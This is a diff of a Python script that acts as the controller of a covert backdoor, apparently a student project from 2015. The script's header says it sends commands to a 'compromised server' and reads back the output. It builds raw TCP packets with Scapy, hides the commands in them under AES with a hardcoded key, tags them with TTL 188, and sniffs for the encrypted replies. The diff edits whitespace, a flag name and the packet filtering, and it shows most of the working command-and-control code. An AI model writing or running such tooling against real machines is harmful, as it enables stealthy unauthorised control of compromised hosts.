@@ -3,7 +3,7 @@
 --
 --  PROGRAM:        Sends data (commands) to the compromised server and receives
 --					back the output from the server.
---                 
+--
 --	FUNCTIONS:		encryptData(data),
 --					decryptData(data),
 --					packetCraft(destIP, destPort, data),
@@ -15,7 +15,7 @@
 --  REVISIONS:      October 17, 2015
 --
 --  NOTES:
---  The program requires "Scapy", argparse, and pycrypto APIs as well as root 
+--  The program requires "Scapy", argparse, and pycrypto APIs as well as root
 --	user privilege in order to work properly.
 --  http://www.secdev.org/projects/scapy/
 --  https://docs.python.org/dev/library/argparse.html
@@ -24,8 +24,6 @@
 
 #!/usr/bin/python
 from scapy.all import *
-import logging
-logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from Crypto.Cipher import AES
 import argparse
 
@@ -36,7 +34,7 @@ cmdParser.add_argument('-i',
 					dest='destIP',
 					help='Destination IP address of the host to send the command to.',
 					required=True)
-cmdParser.add_argument('-p',
+cmdParser.add_argument('-d',
 					'--dstPort',
 					dest='destPort',
 					help='Destination port of the host to send the command to.',
@@ -55,7 +53,7 @@ args = cmdParser.parse_args();
 --  Description:
 --      Function to encrypt the passed in data string using AES with the specified
 -- 		encryption key and salt value.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def encryptData(data):
 	#Both key and salt values have to be 16 bytes due to the way AES encryption works.
 	key = "JustinTom 8505A3"
@@ -78,7 +76,7 @@ def encryptData(data):
 --  Description:
 --      Function to decrypt the passed in data string using AES with the specified
 -- 		decryption key and salt value.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def decryptData(data):
 	#Both key and salt values have to be 16 bytes due to the way AES encryption works.
 	key = "JustinTom 8505A3"
@@ -105,11 +103,11 @@ def decryptData(data):
 --  Description:
 --      Function to build a custom packet with the user specified values in order
 --		to later send to the server.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def packetCraft(destIP, destPort, data):
     destPort = int(destPort)
-    #Craft a custom packet with the specified values, and the encrypted 
-    #data command in the load field of the packet's Raw layer. Also set the 
+    #Craft a custom packet with the specified values, and the encrypted
+    #data command in the load field of the packet's Raw layer. Also set the
     #ttl to 188 as an extra layer of identity.
     craftedPacket = IP(dst=destIP, ttl=188)/TCP(dport=destPort)/Raw(load=data)
     return craftedPacket
@@ -124,10 +122,10 @@ def packetCraft(destIP, destPort, data):
 --      None.
 --  Description:
 --      Function to parse the packet object from the scapy sniff of the network
---		traffic going to the terminal and filter it further to ensure it is the 
---		packet we are looking for from the compromised server. It will then 
+--		traffic going to the terminal and filter it further to ensure it is the
+--		packet we are looking for from the compromised server. It will then
 --		decrypt the extracted data.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def getOutput(packet):
 	#Sometimes an ARP broadcast and request before sending crafted packets
 	#If condition to filter out the ARP packets since we only want the
@@ -136,7 +134,7 @@ def getOutput(packet):
 		ttl = packet[IP].ttl
 		srcIP = packet[IP].src
 		dPort = packet[TCP].dport
-		if ttl == 188 and srcIP == args.destIP and dPort == args.destPort:
+		if ttl == 188 and srcIP == args.destIP and dPort == int(args.destPort):
 			output = packet[Raw].load
 			decryptedOutput = decryptData(output)
 			print decryptedOutput
@@ -156,13 +154,13 @@ def getOutput(packet):
 --  Description:
 --      Function to check if the packet we sniffed is the right one by filtering it
 --		by the values we've put in our crafter packets. Returns true or false.
-'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''  
+'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
 def packetCheck(packet):
 	if IP in packet[0] and Raw in packet[2]:
 		ttl = packet[IP].ttl
 		srcIP = packet[IP].src
 		dPort = packet[TCP].dport
-		if ttl == 188 and srcIP == args.destIP and dPort == args.destPort:
+		if ttl == 188 and srcIP == args.destIP and dPort == int(args.destPort):
 			return True
 	else:
 		return False
@@ -193,6 +191,5 @@ if __name__ == "__main__":
 		else:
 			#Sniff for the output result of the command from the server
 			#Ensure a stop filter when the correct packet is received.
-			dstPort = str(args.destPort)
-			sniff(filter="tcp and dstPort " + dstPort, prn=getOutput, stop_filter=packetCheck)
+			sniff(filter="tcp", prn=getOutput, stop_filter=packetCheck)
 			sendFlag = True
